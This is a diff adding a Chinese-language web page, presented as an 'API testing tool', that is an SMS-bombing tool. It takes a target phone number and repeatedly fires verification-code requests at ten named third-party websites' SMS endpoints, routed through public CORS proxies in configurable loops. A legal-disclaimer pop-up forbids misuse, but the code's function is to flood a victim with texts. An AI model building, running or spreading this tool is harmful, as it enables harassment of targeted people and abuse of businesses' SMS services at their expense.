@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>接口测试工具2012</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 min-h-screen p-4 md:p-8">
+    <div class="max-w-2xl mx-auto bg-white rounded-lg shadow-md p-6">
+        <div class="flex justify-between items-center mb-6">
+            <h1 class="text-2xl font-bold text-gray-800">接口测试工具2012</h1>
+            <div class="flex gap-2">
+                <!-- 更新日志按钮 -->
+                <button id="changelogBtn" class="bg-gray-600 text-white py-1 px-3 rounded-md hover:bg-gray-700 transition-colors text-sm">
+                    更新日志
+                </button>
+                <!-- 联系作者按钮 -->
+                <button onclick="window.open('https://qm.qq.com/q/ZrrGU44B6m','_blank')" class="bg-green-600 text-white py-1 px-3 rounded-md hover:bg-green-700 transition-colors text-sm">
+                    联系作者
+                </button>
+            </div>
+        </div>
+
+        <!-- 作者信息 -->
+        <div class="text-center text-gray-500 text-sm mb-6">
+            作者：豪哥 | 仅供合法测试使用
+        </div>
+
+        <div class="space-y-4 mb-6">
+            <!-- 模式选择 -->
+            <div>
+                <label class="block text-sm font-medium text-gray-700 mb-2">选择模式</label>
+                <select id="mode" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    <option value="1">批量循环（所有接口）</option>
+                    <option value="2">单项测试（1-10接口可用）</option>
+                </select>
+            </div>
+            <!-- 手机号输入 -->
+            <div>
+                <label class="block text-sm font-medium text-gray-700 mb-2">目标手机号</label>
+                <input type="tel" id="target" maxlength="11" placeholder="请输入11位手机号" 
+                    class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+            </div>
+            <!-- 接口编号（仅单项测试显示） -->
+            <div id="testIdContainer" class="hidden">
+                <label class="block text-sm font-medium text-gray-700 mb-2">测试接口编号(1-10)</label>
+                <input type="number" id="testId" min="1" max="10" placeholder="请输入接口编号" 
+                    class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+            </div>
+            <!-- 批量模式参数 -->
+            <div id="batchParamsContainer">
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700 mb-2">循环轮数</label>
+                        <input type="number" id="loopCount" value="1" min="1" 
+                            class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700 mb-2">接口间隔(秒)</label>
+                        <input type="number" id="sendDelay" value="0" min="0" 
+                            class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700 mb-2">轮次间隔(秒)</label>
+                        <input type="number" id="roundDelay" value="1" min="0" 
+                            class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    </div>
+                </div>
+            </div>
+            <!-- 按钮组 -->
+            <div class="flex gap-4">
+                <button id="startBtn" class="flex-1 bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 transition-colors">
+                    开始执行
+                </button>
+                <button id="stopBtn" class="flex-1 bg-red-600 text-white py-2 px-4 rounded-md hover:bg-red-700 transition-colors" disabled>
+                    停止执行
+                </button>
+            </div>
+        </div>
+        <!-- 日志区域 -->
+        <div>
+            <label class="block text-sm font-medium text-gray-700 mb-2">执行日志</label>
+            <div id="log" class="bg-gray-900 text-green-400 p-4 rounded-md h-80 overflow-y-auto font-mono text-sm">
+                <div>工具已就绪，请输入参数后点击开始执行</div>
+                <div>当前使用：双代理自动切换模式</div>
+            </div>
+        </div>
+    </div>
+    <!-- 更新日志模态框 -->
+    <div id="changelogModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
+        <div class="bg-white rounded-lg shadow-lg w-full max-w-md mx-4 max-h-[80vh] overflow-y-auto">
+            <div class="flex justify-between items-center p-4 border-b">
+                <h2 class="text-xl font-bold text-gray-800">更新日志</h2>
+                <button id="closeModalBtn" class="text-gray-500 hover:text-gray-700 text-2xl">&times;</button>
+            </div>
+            <div class="p-4 space-y-4">
+                <div>
+                    <h3 class="font-bold text-blue-600">v2.0.1.2 | 2026-05-11</h3>
+                    <ul class="list-disc list-inside text-sm text-gray-700 mt-2 space-y-1">
+                        <li>新增第10个接口</li>
+                        <li>修复语法错误</li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold text-blue-600">v2.0.1.0 | 2026-05-11</h3>
+                    <ul class="list-disc list-inside text-sm text-gray-700 mt-2 space-y-1">
+                        <li>新增更新日志</li>
+                        <li>优化排版</li>
+                        <li>修复请求失败的问题</li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold text-blue-600">v2.0.0.9 | 2026-05-11</h3>
+                    <ul class="list-disc list-inside text-sm text-gray-700 mt-2 space-y-1">
+                        <li>新增双代理修复浏览器跨域请求失败问题</li>
+                        <li>重构主文件</li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold text-blue-600">v2.0.0.8 | 2026-05-11</h3>
+                    <ul class="list-disc list-inside text-sm text-gray-700 mt-2 space-y-1">
+                        <li>初始版本发布</li>
+                        <li>移植终端shell脚本</li>
+                        <li>构建UI</li>
+                        <li>解决服务端运维问题</li>
+                        <li>新增接口9</li>
+                    </ul>
+                </div>               
+            </div>
+        </div>
+    </div>
+    <script>
+        let isRunning = false;
+        let abortController = null;
+        
+        // 双代理配置（按稳定性排序，自动切换）
+        const PROXIES = [
+            'https://api.allorigins.win/raw?url=',
+            'https://corsproxy.io/?'
+        ];
+        let currentProxyIndex = 0;
+        // 模式切换
+        document.getElementById('mode').addEventListener('change', function() {
+            const mode = this.value;
+            const testIdContainer = document.getElementById('testIdContainer');
+            const batchParamsContainer = document.getElementById('batchParamsContainer');
+            
+            if (mode === '2') {
+                testIdContainer.classList.remove('hidden');
+                batchParamsContainer.classList.add('hidden');
+            } else {
+                testIdContainer.classList.add('hidden');
+                batchParamsContainer.classList.remove('hidden');
+            }
+        });
+        // 日志输出
+        function log(message) {
+            const logDiv = document.getElementById('log');
+            const time = new Date().toLocaleTimeString();
+            const line = document.createElement('div');
+            line.textContent = `[${time}] ${message}`;
+            logDiv.appendChild(line);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+        // 睡眠函数
+        function sleep(seconds) {
+            return new Promise(resolve => setTimeout(resolve, seconds * 1000));
+        }
+        // 带代理的请求发送函数（自动重试切换代理）
+        async function sendRequestWithProxy(url, options, apiId) {
+            for (let i = 0; i < PROXIES.length; i++) {
+                const proxy = PROXIES[(currentProxyIndex + i) % PROXIES.length];
+                const proxyUrl = proxy + encodeURIComponent(url);
+                
+                try {
+                    log(`使用代理${(currentProxyIndex + i) % PROXIES.length + 1}请求接口${apiId}`);
+                    const response = await fetch(proxyUrl, {
+                        ...options,
+                        signal: abortController.signal
+                    });
+                    
+                    if (response.ok) {
+                        // 成功后更新当前代理索引，下次优先用这个
+                        currentProxyIndex = (currentProxyIndex + i) % PROXIES.length;
+                        return response;
+                    } else {
+                        log(`代理${(currentProxyIndex + i) % PROXIES.length + 1}返回错误: ${response.status}`);
+                    }
+                } catch (error) {
+                    if (error.name === 'AbortError') {
+                        throw error;
+                    }
+                    log(`代理${(currentProxyIndex + i) % PROXIES.length + 1}请求失败: ${error.message}`);
+                }
+            }
+            
+            throw new Error('所有代理都请求失败');
+        }
+        // 发送接口请求
+        async function sendRequest(apiId, target) {
+            log(`准备请求接口${apiId}`);
+            
+            try {
+                let url, options;
+                switch(apiId) {
+                    case 1:
+                        url = 'https://www.jszyfw.com/PhoneNote/sendNote';
+                        options = {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                            body: `mobileNum=${target}&note=1`
+                        };
+                        break;
+                    case 2:
+                        url = 'https://www.rsk.cn/api/auth/send-sms';
+                        options = {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ phone: target })
+                        };
+                        break;
+                    case 3:
+                        url = 'https://jxdj.jingxiangdj.com/index.php/api/client/config';
+                        options = {
+                            method: 'POST',
+                            headers: { 
+                                'version_code': '111',
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({ op: 'sms_code', mobile: target })
+                        };
+                        break;
+                    case 4:
+                        url = 'https://prod.chujingapp.com/ooc_assistant/api/sms/sendVerifyCode';
+                        options = {
+                            method: 'POST',
+                            headers: { 'package-name': 'com.easy.abroad' },
+                            body: `phone_num=${target}`
+                        };
+                        break;
+                    case 5:
+                        url = 'https://bounty.gomays.com/api/sms/send';
+                        options = {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                            body: `type=1&event=register&mobile=${target}&appType=goldhelp`
+                        };
+                        break;
+                    case 6:
+                        url = 'https://api.duoduoxuanshang.cn/user/sendSMS';
+                        options = {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                            body: `phone=${target}`
+                        };
+                        break;
+                    case 7:
+                        url = 'https://c.00242.cn/api/user/SendMsgCode';
+                        options = {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ 
+                                account: target, 
+                                userful: 'reglogin', 
+                                version: '4752', 
+                                apptype: '20', 
+                                token: '' 
+                            })
+                        };
+                        break;
+                    case 8:
+                        url = `https://api.zhuayoubao.com/httzyb/api/login/getVerificationCode?phone=${target}&channel=29&packageName=com.zhuayoubao.box`;
+                        options = { method: 'GET' };
+                        break;
+                    case 9:
+                        url = 'https://bapt.cloudxin.vip/App/SliderVerificationAndSendCode';
+                        options = {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ 
+                                Mobile: target, 
+                                Source: 'Android', 
+                                AppId: 'YXJY003'
+                            })
+                        };
+                        break;
+                    case 10:
+                        url = 'http://www.szsrcw.com/Mobile/Members/reg_send_sms.htm';
+                        options = {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                            body: `sms_type=login&mobile=${target}`
+                        };
+                        break;
+                    default:
+                        // 10-100接口原脚本为空，仅打印日志
+                        log(`接口${apiId}未配置，跳过`);
+                        return;
+                }
+                
+                const response = await sendRequestWithProxy(url, options, apiId);
+                const result = await response.text();
+                log(`接口${apiId}响应: ${result.substring(0, 100)}${result.length > 100 ? '...' : ''}`);
+            } catch (error) {
+                if (error.name === 'AbortError') {
+                    log(`接口${apiId}请求已取消`);
+                } else {
+                    log(`接口${apiId}最终请求失败: ${error.message}`);
+                }
+            }
+        }
+        // 开始执行
+        document.getElementById('startBtn').addEventListener('click', async function() {
+            const mode = document.getElementById('mode').value;
+            const target = document.getElementById('target').value.trim();
+            const testId = document.getElementById('testId').value;
+            const loopCount = parseInt(document.getElementById('loopCount').value) || 1;
+            const sendDelay = parseInt(document.getElementById('sendDelay').value) || 0;
+            const roundDelay = parseInt(document.getElementById('roundDelay').value) || 1;
+            
+            // 手机号校验
+            if (!target || target.length !== 11) {
+                alert('请输入正确的11位手机号');
+                return;
+            }
+            
+            // 单项测试接口编号校验
+            if (mode === '2' && (!testId || testId < 1 || testId > 10)) {
+                alert('请输入1-10之间的接口编号');
+                return;
+            }
+            
+            // 重置状态
+            isRunning = true;
+            abortController = new AbortController();
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = false;
+            document.getElementById('log').innerHTML = '';
+            log(`开始执行 目标号码：${target}`);
+            log(`接口间隔：${sendDelay} 秒`);
+            log(`轮次间隔：${roundDelay} 秒`);
+            log(`当前代理：${PROXIES[currentProxyIndex].substring(0, 30)}...`);
+            log('--------------------------------');
+            
+            try {
+                for (let i = 1; i <= loopCount && isRunning; i++) {
+                    log(`第 ${i} 轮`);
+                    if (mode === '2') {
+                        // 单项测试
+                        await sendRequest(parseInt(testId), target);
+                    } else {
+                        // 批量测试所有接口
+                        for (let apiId = 1; apiId <= 100 && isRunning; apiId++) {
+                            await sendRequest(apiId, target);
+                            if (apiId < 100 && isRunning) {
+                                await sleep(sendDelay);
+                            }
+                        }
+                    }
+                    log('本轮完成');
+                    if (i < loopCount && isRunning) {
+                        await sleep(roundDelay);
+                    }
+                }
+                
+                if (isRunning) {
+                    log('--------------------------------');
+                    log('执行完毕');
+                } else {
+                    log('--------------------------------');
+                    log('执行已停止');
+                }
+            } catch (error) {
+                log(`执行出错: ${error.message}`);
+            } finally {
+                isRunning = false;
+                document.getElementById('startBtn').disabled = false;
+                document.getElementById('stopBtn').disabled = true;
+            }
+        });
+        // 停止执行
+        document.getElementById('stopBtn').addEventListener('click', function() {
+            isRunning = false;
+            if (abortController) {
+                abortController.abort();
+            }
+        });
+        // 更新日志模态框控制
+        const changelogBtn = document.getElementById('changelogBtn');
+        const changelogModal = document.getElementById('changelogModal');
+        const closeModalBtn = document.getElementById('closeModalBtn');
+        changelogBtn.addEventListener('click', function() {
+            changelogModal.classList.remove('hidden');
+        });
+        closeModalBtn.addEventListener('click', function() {
+            changelogModal.classList.add('hidden');
+        });
+        // 点击模态框背景关闭
+        changelogModal.addEventListener('click', function(e) {
+            if (e.target === changelogModal) {
+                changelogModal.classList.add('hidden');
+            }
+        });
+    </script>
+</body>
+<!-- 合规警告弹窗 -->
+<style>
+#warningModal{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px;}
+.warningBox{max-width:680px;background:#111;color:#fff;border-radius:12px;padding:30px;position:relative;border:2px solid red;}
+.warningTitle{font-size:22px;font-weight:bold;color:red;text-align:center;margin-bottom:20px;}
+.warningContent{font-size:15px;line-height:1.7;color:#eee;}
+.warningContent strong{color:red;}
+.btnAgree{background:red;color:#fff;border:none;padding:12px 24px;border-radius:8px;font-size:16px;margin-top:20px;width:100%;font-weight:bold;cursor:pointer;}
+</style>
+<div id="warningModal">
+  <div class="warningBox">
+    <div class="warningTitle">⚠️ 法律风险警告 & 用户协议</div>
+    <div class="warningContent">
+      <strong>本工具仅限合法接口开发、测试使用。</strong><br><br>
+      1. 严禁利用本工具发送垃圾短信、骚扰短信、诈骗信息；<br>
+      2. 严禁用于恶意攻击、批量轰炸、爬虫、入侵、未授权测试；<br>
+      3. 严禁从事任何违法违规、侵犯他人权益的活动；<br>
+      4. 一切违规使用后果自负，开发者不承担任何法律责任；<br>
+      5. 违规使用将承担民事、行政乃至刑事责任。<br><br>
+      <strong>使用即代表您已同意上述条款，并承诺合法合规使用！</strong>
+    </div>
+    <button class="btnAgree" onclick="document.getElementById('warningModal').remove()">我已阅读，同意并遵守</button>
+  </div>
+</div>
+</html>
